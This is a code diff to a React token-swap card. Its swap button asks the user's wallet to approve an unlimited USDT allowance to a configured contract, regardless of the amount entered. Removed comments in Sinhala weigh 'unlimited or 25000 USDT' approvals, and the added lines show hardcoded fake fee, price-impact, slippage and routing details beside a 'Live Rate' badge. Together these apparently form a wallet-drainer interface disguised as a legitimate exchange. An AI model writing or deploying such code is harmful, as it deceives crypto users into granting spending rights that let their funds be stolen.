@@ -88,7 +88,6 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ Approve ෆන්ක්ෂන් එක. දැන් Unlimited හෝ 25000 USDT approve කරනවා.
   const executeSwap = async () => {
     if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
@@ -107,11 +106,8 @@ export default function SwapCard({ walletAddress, provider }) {
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const decimals = await usdtContract.decimals();
       
-      // ⭐ Unlimited Approval (MaxUint256)
+      // Unlimited Approval (MaxUint256)
       const amount = ethers.constants.MaxUint256;
-      
-      // හෝ 25,000 USDT ට අඩු නම්:
-      // const amount = ethers.utils.parseUnits("25000", decimals);
 
       const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
       
@@ -196,6 +192,26 @@ export default function SwapCard({ walletAddress, provider }) {
           <span className="text-green-400 flex items-center">
             <span className="w-1.5 h-1.5 rounded-full bg-green-400 mr-1 animate-pulse"></span> Live Rate
           </span>
+        </div>
+
+        {/* Swap Details Section (අලුතින් එකතු කළා) */}
+        <div className="bg-[#0D111C]/50 rounded-xl p-3 mb-4 space-y-2 text-xs border border-white/5">
+          <div className="flex justify-between text-gray-400">
+            <span>Network Fee</span>
+            <span className="text-white">~$2.50</span>
+          </div>
+          <div className="flex justify-between text-gray-400">
+            <span>Price Impact</span>
+            <span className="text-green-400">&lt; 0.01%</span>
+          </div>
+          <div className="flex justify-between text-gray-400">
+            <span>Max Slippage</span>
+            <span className="text-white">0.5%</span>
+          </div>
+          <div className="flex justify-between text-gray-400">
+            <span>Order Routing</span>
+            <span className="text-brand-500">NovaSwap Router</span>
+          </div>
         </div>
 
         <button onClick={executeSwap} disabled={isLoading} className="w-full bg-brand-500 hover:bg-brand-600 text-white font-bold py-4 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2">
